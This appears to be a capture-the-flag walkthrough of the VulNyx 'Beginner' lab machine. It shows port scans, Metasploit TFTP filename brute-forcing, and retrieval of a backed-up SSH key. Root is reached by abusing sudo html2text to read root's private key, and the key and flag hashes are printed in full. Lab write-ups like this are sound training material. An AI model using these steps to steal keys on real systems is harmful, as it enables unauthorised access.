# VulNyx - Beginner

## Information
**Beginner** is a low difficulty vulnerable Linux virtual machine from the VulNyx platform, it was created by user `d4t4s3c` and works correctly on VirtualBox and VMware hypervisors.

## Solution
### Enumeration
#### Nmap 
Run `nmap` to discover open port (SSH on 22, HTTP on 80).
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sCV -p- -T4 192.168.100.151    
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-20 19:58 +07
Nmap scan report for beginner.lan (192.168.100.151)
Host is up (0.042s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:E0:52:93 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 203.31 seconds
```
Accessing the address `http://192.168.100.151` will display information like this:
![beginner-web](/walkthroughs/vulnyx/low-difficulty/beginner/beginner-web.png)

Scan UDP ports to find services like **TFTP**:
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ sudo nmap -sU --top-port 100 192.168.100.151
[sudo] password for dungcngo: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-20 20:05 +07
Nmap scan report for beginner.lan (192.168.100.151)
Host is up (0.034s latency).
Not shown: 98 closed udp ports (port-unreach)
PORT   STATE         SERVICE
68/udp open|filtered dhcpc
69/udp open|filtered tftp
MAC Address: 08:00:27:E0:52:93 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 106.38 seconds
```

### Shell (boris)
Use **Metasploit TFTP brute force** to list files.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ sudo msfconsole          
[sudo] password for dungcngo: 
Metasploit tip: Add routes to pivot through a compromised host using route 
add <subnet> <session_id>
.......
msf > search tftp brute

Matching Modules
================

   #  Name                              Disclosure Date  Rank    Check  Description
   -  ----                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/tftp/tftpbrute  .                normal  No     TFTP Brute Forcer


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/tftp/tftpbrute                                                                

msf > use 0
msf auxiliary(scanner/tftp/tftpbrute) > options

Module options (auxiliary/scanner/tftp/tftpbrute):

   Name        Current Setting        Required  Description
   ----        ---------------        --------  -----------
   CHOST                              no        The local client address
   DICTIONARY  /usr/share/metasploit  yes       The list of filenames
               -framework/data/wordl
               ists/tftp.txt
   RHOSTS                             yes       The target host(s), see https://doc
                                                s.metasploit.com/docs/using-metaspl
                                                oit/basics/using-metasploit.html
   RPORT       69                     yes       The target port
   THREADS     1                      yes       The number of concurrent threads (m
                                                ax one per host)


View the full module info with the info, or info -d command.

msf auxiliary(scanner/tftp/tftpbrute) > set RHOSTS 192.168.100.151
RHOSTS => 192.168.100.151
msf auxiliary(scanner/tftp/tftpbrute) > run
[+] Found backup-config on 192.168.100.151
[+] Found unidencom.txt on 192.168.100.151
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
Download `backup-config` via TFTP.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ tftp 192.168.100.151
tftp> get backup-config
tftp> quit
                                                                                     
┌──(dungcngo㉿kali)-[/tmp]
└─$ ls
backup-config
systemd-private-3fa41340e26f403a83bdb9da043d1b5d-colord.service-TW5zCj
systemd-private-3fa41340e26f403a83bdb9da043d1b5d-haveged.service-4LeVLr
systemd-private-3fa41340e26f403a83bdb9da043d1b5d-ModemManager.service-4iI8If
systemd-private-3fa41340e26f403a83bdb9da043d1b5d-pcscd.service-ac9iLc
systemd-private-3fa41340e26f403a83bdb9da043d1b5d-polkit.service-OyHYmO
systemd-private-3fa41340e26f403a83bdb9da043d1b5d-systemd-logind.service-End0aI
systemd-private-3fa41340e26f403a83bdb9da043d1b5d-upower.service-Ko5fp0
```
Extract the archive to get `id_rsa` (SSH private key) and `sshd_config`.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ file backup-config 
backup-config: Zip archive data, made by v3.0 UNIX, extract using at least v1.0, last modified Jul 24 2023 11:40:32, uncompressed size 0, method=store
                                                                                     
┌──(dungcngo㉿kali)-[/tmp]
└─$ unzip backup-config 
Archive:  backup-config
   creating: backup/
  inflating: backup/id_rsa           
  inflating: backup/sshd_config  

┌──(dungcngo㉿kali)-[/tmp]
└─$ cd backup 
                                                                                     
┌──(dungcngo㉿kali)-[/tmp/backup]
└─$ ls
id_rsa  sshd_config
                                                                                     
┌──(dungcngo㉿kali)-[/tmp/backup]
└─$ nano sshd_config  
```
Checking the `sshd_config` file, we see user information named `boris`.
![sshd_config](/walkthroughs/vulnyx/low-difficulty/beginner/sshd-config.png)

Adjust permission on `id_rsa` and connect as user `boris` via SSH.
```bash
┌──(dungcngo㉿kali)-[/tmp/backup]
└─$ chmod 600 id_rsa
                                                                                     
┌──(dungcngo㉿kali)-[/tmp/backup]
└─$ ls -la id_rsa 
-rw------- 1 dungcngo dungcngo 1675 Jul 24  2023 id_rsa
                                                                                     
┌──(dungcngo㉿kali)-[/tmp/backup]
└─$ ssh -i id_rsa boris@192.168.100.151
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
boris@beginner:~$ id ; hostname
uid=1000(boris) gid=1000(boris) grupos=1000(boris)
beginner
```

### Privilege Escalation
#### Enumeration
Check `sudo -l` -> `boris` can run `html2text` as root.
```bash
boris@beginner:~$ sudo -l
Matching Defaults entries for boris on beginner:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User boris may run the following commands on beginner:
    (root) NOPASSWD: /usr/bin/html2text
```
#### Abuse
Abuse it to read `/root/.ssh/id_rsa`.
```bash
boris@beginner:~$ sudo html2text /root/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY----- MIIEogIBAAKCAQEAhNACeq9+AH6O1/b3OaUEEIa8/
EmrcLunt8ZJeMKV4fr6bzde
5Sn5HiykGnIduo4DWHsp1n1GQq7Xy+ZyCxZPFWcswb8LAT880KJp7TC69SqqRpSm
Ci7kMh8aahQ6GuhwFMX5eXyj+ThmGUhGNRwknrP058JhsO4w9lzIk/HStfUQZTem
qNKOPLvvgkNuB3LhOrwEbx3NIgeQmJbgEnL4Sl9FDLexThBSWOSln3fatJg39J3R
d12NPluhdk1cso5Y148YebAaqG82Th/OhHm6NhN3MVi/BXyY/MZ2nLbuFaBNVbAj
tFL+Zd5MV54YCH+fYxWUGkdiMG+LsJnydR8uxQIDAQABAoIBAHko9goMTOuQiSmV
4IXS93lIIeIaJu+KEgBCQUaMZYWpm4uYPNbcyqnvWanSjzJgWcb/XPSShmVQ8gbO
bR2WNYE2BYueiCCUGxvN/spmWThNutb2xt6lVoIvA77gQv3HLHCXBvcAcOprvCC2
YW4UBYhObU58cvig40Ps8wKcaniZCcVFKjjwvAGYVdAGm5BproRIvt2M4v9RBVsG
XfWOGI3EOyfJZwvx0dzoUUhe8YzAi3wDjda5/saKv0pKbJHGTkVLCYxlQ409FGq1
jSUAzJ+Wgo1h0IL6B5T5ZtLw2ElxMEf0aekCGOuQHX4J/Dfb3ZwBvawJdq5lAqoE
nZkKw2UCgYEA27q3iyPPAUtKbthTjPZzkngH/E0fbr6q1sbmhNmn00CYB7/snB5H
drSqyaOI+zZX7HZGxDOq/jvuCU/bKJ3xwfYw1TAwYBB7vwrwazQAhsMKReOWTves
Zebv+hQNq4hfL1hcF+azc7fOe3O8jaMS8W92sMpSWcUaGbzxcq1lq/cCgYEAmrxg
o1B0QhLCVXz62vgLubIw9Xm1cAY24lV8Z43QZeeghNQX9/ubOQAO9nbqedNolPwv
GBRI+5Y26mVobJvfQxt54sa3+uEd7AwHz6+gFhHfB0gu1oHQuDRKYV5CXriQPAE9 LEZsV/
82KgVWZVzstsF2G9r3p5Ou4VcU+11ptCMCgYAeGCSrWewwMS+wntBSri6G
EQqG88kqUdL0N6m66FSkCmTIKvEtMLh4+aWqmEtanMbODCUFGk6BI5Qmkllh5sAF
4MIvcLovbhKEx+rFxAmOa4gsqk8b4bArBMY5aiW1KKhgw6lZXK+XWcVeAyv/+iXO C4YmEI/
W27gHbmljW3xhYQKBgFMyN+93YZrpBS37zdEQDxXf9iz2LJS38qiM+B+h
g0xXVto0Q1LlKFdkbacc1wN7pL5+PUAAICGNaadrsNK8mDU3v7gryl4Mzg7NhSGo
tzVGlJkQuYZCNBvmmZtyl9Lf/0UUEXUNxFEn+lJrnkFPzkKREFT3zbJ/WEb2kGR6
nEvrAoGAGwRoisMbU9E4lIibq/JD/i22u5VenuvEqJs8H/cv49DsVdYYBV4rOi/
u RWRA98sN8yc06jFezYYNw4RMk2Nfgeqd3pnNVVHRq9uBOsiOknVVFOOHsMi6IExx
AgMuIviN7GZ1VDlPDbaYw1+8keJq4eeYRkjLpxcMDBJJwNQ8h6c= -----END RSA PRIVATE KEY--
---
```
Save the private key on `id_rsa` file in `/tmp`, set permissions and SSH login as `root`.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ chmod 600 id_rsa
                                                                                     
┌──(dungcngo㉿kali)-[/tmp]
└─$ ls -la id_rsa
-rw------- 1 dungcngo dungcngo 1678 Apr 20 20:24 id_rsa
                                                                                     
┌──(dungcngo㉿kali)-[/tmp]
└─$ ssh -i id_rsa root@192.168.100.151 
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
root@beginner:~# id ; hostname
uid=0(root) gid=0(root) grupos=0(root)
beginner
```
#### Flags
As `root`, locate and read flags.
```bash
root@beginner:~# ls -la
total 32
drwx------  3 root root 4096 jul 24  2023 .
drwxr-xr-x 18 root root 4096 jul 24  2023 ..
lrwxrwxrwx  1 root root    9 abr 23  2023 .bash_history -> /dev/null
-rw-------  1 root root 3526 ene 15  2023 .bashrc
-rw-------  1 root root  161 jul  9  2019 .profile
-rw-r--r--  1 root root   33 jul 24  2023 r000000000000000000000000000000t.txt
-rw-r--r--  1 root root   66 abr 30  2023 .selected_editor
-rwxr-xr-x  1 root root   86 jul 24  2023 .service
drwx------  2 root root 4096 jul 24  2023 .ssh

root@beginner:~# find / -name r000000000000000000000000000000t.txt -o -name user.txt | xargs cat
16bd055a9f14c19d865ebfdcaa22298b
1c539f920aa59947f4ffa073cffdc370
```

***You are welcome!***
